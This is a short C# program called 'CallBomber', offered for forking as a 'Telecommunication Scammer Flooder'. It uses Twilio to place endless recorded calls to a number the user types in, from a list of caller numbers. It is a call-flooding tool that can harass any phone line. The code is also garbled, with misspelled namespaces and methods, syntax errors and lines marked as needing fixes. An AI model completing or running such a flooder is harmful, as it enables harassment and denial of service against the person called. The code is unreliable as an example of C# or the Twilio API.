/*
Fork this code! 
*/
using System; 
using System.Collections.Generic;
using Ststem.Linq;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks; 
using Twilio;

namespace CallBomber
{
    class Program
    {
	public static string accountsid = "*********"; 
	public static string authtoken = "*********";
	public static List<string> numbers = new List<string>(new string[] { "+10000000", "+10000000", }
	public static List<string> numbersInUse = new List<string>();
	public static string NumToCall = "";
	static void Main(string[] args)
	{
	    Console.WriteLine("Telecommunication Scammer Flooder v1.0");
	    
	    Console.WriteLine("Enter the number to flood (+1 MUST BE IN FRONT!):")
	    NumToCall = Console.ReadLine(); 
	    Console.WriteLine("Press ENTER to start the flooder, Otherwise exit the application right now..."
	    Console.Readtime(); 
	    Console.Clear(); 
	    TwilioClient.Init(account$id,authToken);
	    
	    var count = 1;
	    // do while loop 
	    do
	    {
	        Console.WriteLine("Starting Call Batch " + count.ToString() +" ["+ numbers.Count + " Nums.)");
		foreach(string num in numbers)
		{
		    Call(num); 
		    System.Threading.Thread.Sleep(1000);
		}
		count++; 
		System.Threading.Thread.Sleep(5000);
	      }while(true);
	  }
	  
	  // Call Function
	  
	  static void Call(string fromNumber)
	  {
	      try
	      {
	         var call = CallResource.Create{
		     to: var PhoneNumber(NumToCall), // this line needs to be fixed 
		     from = new PhoneNumber(FromNumber),
		     record: true,
		     url: ""
		 };
		 Console.WriteLine(string.format($"Started call to :"{call,To}, from: {FrontNumber}*));   // This line needs to be fixed.
	      }
	      catch(Exception Ex)
	      {
	          Console.WriteLine(string.Format($"Error on number {FromNumber}: {e.Message}"));
	      }
		
	   }
	}
